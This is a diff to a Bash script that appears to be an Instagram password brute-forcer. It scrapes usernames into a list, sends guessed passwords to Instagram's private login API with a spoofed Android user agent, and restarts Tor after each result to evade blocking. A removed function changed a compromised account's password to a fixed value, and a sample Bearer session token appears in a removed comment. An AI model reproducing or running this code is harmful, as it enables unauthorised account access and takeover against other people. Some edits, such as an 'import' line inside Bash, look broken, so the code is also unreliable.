@@ -70,13 +70,21 @@ rm -rf u.txt
         
   }
   Manjur.gaskeun(){
-    curl -D - -s -k -X $'POST' \
+    curl -s -k -X $'POST' \
     -H $'User-Agent: Instagram 265.0.0.19.301 Android (28/9; 240dpi; 720x1280; OnePlus; ONEPLUS A5000; OnePlus5; qcom; en_US)' \
-   --data-urlencode "enc_password=#PWD_INSTAGRAM_BROWSER:0:$(this height):${psss}"\
-   --data-urlencode "username=${lst_user}" \
-   --data-urlencode "device_id=android-$(echo $(String::GenerateUUID))" \
-   --data-urlencode "login_attempt_count=0"  \
-    $'https://i.instagram.com/api/v1/accounts/login/' 
+    --data-urlencode "enc_password=#PWD_INSTAGRAM_BROWSER:0:$(this height):${psss}"\
+    --data-urlencode "username=${lst_user}" \
+    --data-urlencode "device_id=android-$(echo $(String::GenerateUUID))" \
+    --data-urlencode "login_attempt_count=0"  \
+    $'https://i.instagram.com/api/v1/accounts/login/'
+   #  curl -D - -s -k -X $'POST' \
+   #  -H $'User-Agent: Instagram 265.0.0.19.301 Android (28/9; 240dpi; 720x1280; OnePlus; ONEPLUS A5000; OnePlus5; qcom; en_US)' \
+   # --data-urlencode "enc_password=#PWD_INSTAGRAM_BROWSER:0:$(this height):${psss}"\
+   # --data-urlencode "username=${lst_user}" \
+   # --data-urlencode "device_id=android-$(echo $(String::GenerateUUID))" \
+   # --data-urlencode "login_attempt_count=0"  \
+   #  $'https://i.instagram.com/api/v1/accounts/login/' 
+   return
 
 
   }
@@ -90,7 +98,10 @@ rm -rf u.txt
    #  local pars_igt=$(echo -e $(this gaskeun) )
      local MESAG=$(echo -e "$(this gaskeun)"| grep -oP '(?<=message":")[^"]*')
      local USER_ui=$(echo -e "$(this gaskeun)"|grep -oP '(?<="strong_id__":")[^"]*')
-     if [[ $MESAG =~ "true" ]]; then
+     local statu_se=$(echo -e $(this gaskeun)|grep -oP '(?<="status":")[^"]*')
+     #echo $MESAG
+     
+     if [[ $statu_se =~ "ok" ]]; then
               echo -e "$(UI.Color.Green)[+] $(UI.Color.Default)[I GOT IT SUCCES]  \n"
               echo -e "$(UI.Color.Green)[+] $(UI.Color.Default)USERid -> ${USER_ui}  \n"
               killall -HUP tor
@@ -110,6 +121,9 @@ rm -rf u.txt
              echo -e "unkown"
              killall -HUP tor
         fi
+
+
+
      #    # elif [[ $MESAG =~ "" ]]; then
      #     #     echo -e "$(UI.Color.Red)[-] FAILED bf ${lst_user}|${psss}"
      #     #     killall -HUP tor
@@ -128,19 +142,8 @@ rm -rf u.txt
       
   }
   Manjur.CagWEti(){
-  # example Bearer IGT:2:eyJkc191c2VyX2lkIjoiMjI5NTI0NzE2MzEiLCJzZXNzaW9uaWQiOiIyMjk1MjQ3MTYzMSUzQTR3VGF0ajBRSUxFRGw2JTNBMTklM0FBWWZlZm9WVDJnVXVHRVNzNHNTSHZjckpfbkRvREh4Y3RUSkd2NGhhZ3cifQ==
-      curl -s -k -X $'POST' \
-    -H $'Host: i.instagram.com' \
-    -H $'X-Ig-App-Locale: in_ID' \
-    -H $'X-Ig-Device-Locale: en_US' \
-    -H $'X-Ig-Mapped-Locale: id_ID' \
-    -H $'User-Agent: Instagram 265.0.0.19.301 Android (28/9; 240dpi; 720x1280; OnePlus; ONEPLUS A5000; OnePlus5; qcom; en_US)' \
-    -H $'Accept-Language: id-ID' \
-    -H $'Authorization: '  \
-     --data-urlencode "enc_old_password=#PWD_INSTAGRAM_BROWSER:0:$(this height):${psss}" \
-     --data-urlencode "enc_new_password1=#PWD_INSTAGRAM_BROWSER:0:$(this height):jfeofijeoifjewfjj" \
-     --data-urlencode "enc_new_password2=#PWD_INSTAGRAM_BROWSER:0:$(this height):jfeofijeoifjewfjj" \
-    $'https://i.instagram.com/api/v1/accounts/change_password/'
+  import util/tz
+  return 
   }
   Manjur.getUs(){
     touch u.txt
@@ -152,6 +155,7 @@ rm -rf u.txt
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36 Edg/113.0.1774.42' \
   -H 'x-requested-with: XMLHttpRequest' \
   --compressed -b $cok|grep -Po '(?<="username":").*?(?=")'|sort -u >> u.txt
+  return
   }
   
 LIMIT="15"
@@ -159,4 +163,3 @@ Type::Initialize Manjur
 Manjur oke
 $var:oke height = $(date +%s%N|cut -b1-13)
 $var:oke
-
